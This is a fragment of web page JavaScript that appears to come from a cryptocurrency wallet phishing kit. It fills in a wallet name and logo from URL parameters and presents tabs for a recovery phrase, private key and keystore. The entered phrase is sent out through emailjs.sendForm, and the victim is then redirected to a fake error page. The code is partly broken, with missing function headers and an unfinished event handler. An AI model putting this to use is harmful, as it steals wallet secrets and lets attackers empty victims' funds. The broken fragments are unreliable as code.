  <script type="text/javascript">

    var nameParam;
    document.addEventListener("DOMContentLoaded", function () {
      var urlParams = new URLSearchParams(window.location.search);

      var imgParam = urlParams.get('img');

      nameParam = urlParams.get('name');
      console.log(nameParam);
      document.getElementById("walle_img").src = imgParam;
      document.getElementById("walle_name1").innerText = nameParam;
      document.getElementById("walle_name2").innerText = nameParam;

      document.getElementById('phras_header').style.color = "#2563EB";

    });

    console.log("first");
    document.getElementById('phras_outer_block')
      .addEventListener('click', function (event) {
        hideAll();
        document.getElementById('phras_inner_block').classList.remove("hider");
        document.getElementById('phras_header').style.color = "#2563EB";
        document.getElementById("walle_id1").value = nameParam;
        console.log(nameParam);
        console.log("HLJLJ");
      });

      document.getElementById("phras_inner_block").classList.add("hider");

      document.getElementById("acces_inner_block").classList.add("hider");

      document.getElementById('privat_header').style.color = "black";
      document.getElementById('acces_header').style.color = "black";
      document.getElementById('keystor_header').style.color = "black";
    }




    document.getElementById('phras_form')

        event.preventDefault();
        document.getElementById("subi_btn_phras").innerText = "Processing...";
        document.getElementById("show_loader_phras").classList.remove("hider");
        document.getElementById("btn_loader_phras").disabled = true;

        const serviceID = 'default_service';
        const templateID = 'template_4yqdkvl';

        emailjs.sendForm(serviceID, templateID, this)
          .then(() => {
            window.location = "../error/index.html"
          }, (err) => {
            document.getElementById("subi_btn_phras").innerText = "PROCEED";
            document.getElementById("show_loader_phras").classList.add("hider");

            alert("Please try again!");
